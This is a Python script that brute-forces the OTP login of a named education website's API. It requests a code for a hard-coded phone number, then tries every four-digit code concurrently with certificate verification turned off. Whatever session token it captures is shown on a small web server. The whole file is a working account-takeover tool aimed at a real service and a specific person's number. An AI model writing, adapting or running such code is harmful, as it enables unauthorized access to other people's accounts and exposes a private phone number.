import asyncio
import aiohttp
import logging
from aiohttp import ClientOSError, ClientResponseError, ClientConnectionError
from aiohttp.web import Application, Response, run_app
import ssl

# Configurations
phone_number = "9352631731"
request_otp_url = "https://spec.iitschool.com/api/v1/login-otp"
verify_otp_url = "https://spec.iitschool.com/api/v1/login-otpverify"

# Global token
global_token = None

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# SSL Configuration
ssl_context = ssl.create_default_context()
ssl_context.set_ciphers("DEFAULT")
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE


async def request_otp(session, phone):
    """Request OTP for the phone number."""
    logger.info(f"Requesting OTP for phone number: {phone}")
    data = {"phone": phone}
    headers = {
        "Accept": "application/json",
        "origintype": "web",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        async with session.post(request_otp_url, data=data, headers=headers) as response:
            if response.status == 200:
                response_data = await response.json()
                if response_data.get("responseCode") == 200:
                    logger.info("OTP requested successfully. Check your phone.")
                    return True
            logger.error(f"Failed to request OTP. Response: {response.status}")
    except Exception as e:
        logger.error(f"Error while requesting OTP: {e}")
    return False


async def verify_otp(session, phone, otp, max_retries=3):
    """Verify OTP and return the token if successful."""
    verify_otp_data = {
        "phone": phone,
        "otp": otp,
        "type": "kkweb",
        "deviceType": "web",
        "deviceVersion": "Chrome 124",
        "deviceModel": "chrome",
    }
    headers = {
        "Accept": "application/json",
        "origintype": "web",
        "Content-Type": "application/x-www-form-urlencoded",
    }

    for attempt in range(max_retries):
        try:
            async with session.post(verify_otp_url, data=verify_otp_data, headers=headers) as response:
                if response.status == 200:
                    response_data = await response.json()
                    token = response_data.get("data", {}).get("token")
                    if token:
                        logger.info(f"✅ Valid OTP Found: {otp} | Token: {token}")
                        return token
                else:
                    logger.warning(f"⚠️ Failed OTP {otp}: {response.status}")
        except (ClientOSError, ClientResponseError, ClientConnectionError) as e:
            logger.warning(f"Retrying OTP {otp} (attempt {attempt + 1}/{max_retries}): {str(e)}")
            await asyncio.sleep(1)  # Wait before retrying
    return None


async def fetch_token():
    """Fetch token by checking OTPs."""
    global global_token
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
        # Request OTP
        otp_requested = await request_otp(session, phone_number)
        if not otp_requested:
            logger.error("❌ Unable to request OTP. Exiting.")
            return None

        logger.info("🔍 Starting OTP verification...")
        tasks = []
        max_concurrent_requests = 5  # Limit concurrent requests to avoid server overload
        for start_otp in range(1000, 10000, 100):
            logger.info(f"🔄 Checking OTPs {start_otp} to {start_otp + 99}...")
            batch = range(start_otp, start_otp + 100)

            for otp in batch:
                task = asyncio.create_task(verify_otp(session, phone_number, str(otp)))
                tasks.append(task)

                if len(tasks) >= max_concurrent_requests:
                    completed, _ = await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)

                    for task in completed:
                        token = await task
                        if token:
                            global_token = token
                            return token

                    tasks = [t for t in tasks if not t.done()]

            await asyncio.sleep(0.5)  # Delay to avoid server overload

        # Process remaining tasks
        for task in await asyncio.gather(*tasks):
            if task:
                global_token = task
                return task

        logger.error("❌ Token not found for any OTP.")
        return None


async def handle_request(request):
    """Handle HTTP requests to display the token."""
    if global_token:
        return Response(text=f"Token: {global_token}")
    else:
        return Response(text="Token not available. OTP verification in progress or failed.")


async def start_otp_verification():
    """Start OTP verification in the background."""
    global global_token
    global_token = await fetch_token()


# Koyeb web server setup
async def main():
    # Start OTP verification in the background
    asyncio.create_task(start_otp_verification())

    # Create web app
    app = Application()
    app.router.add_get("/", handle_request)

    # Start server
    logger.info("🚀 Starting web server on port 8080...")
    await run_app(app, port=8080)


if __name__ == "__main__":
    asyncio.run(main())
